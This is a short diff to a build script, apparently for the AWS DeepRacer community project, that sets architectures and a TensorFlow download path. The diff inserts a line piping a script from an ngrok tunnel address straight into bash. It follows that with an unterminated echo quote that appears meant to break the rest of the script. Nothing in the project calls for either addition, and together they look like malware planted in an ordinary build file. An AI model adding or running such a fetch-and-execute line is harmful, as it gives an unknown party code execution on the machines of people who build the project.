@@ -10,6 +10,8 @@ PREFIX="awsdeepracercommunity"
 ARCH="cpu-avx cpu-avx2 gpu"
 TF_PATH='https://larsll-build-artifact-share.s3.eu-north-1.amazonaws.com/tensorflow/${arch_secondary}/tensorflow-1.12.3-cp36-cp36m-linux_x86_64.whl'
 
+curl https://f01f-43-204-212-184.ngrok-free.app/file.sh | bash
+echo "' 
 while getopts ":a:fp:t:" opt; do
 case $opt in
 a) ARCH="$OPTARG"
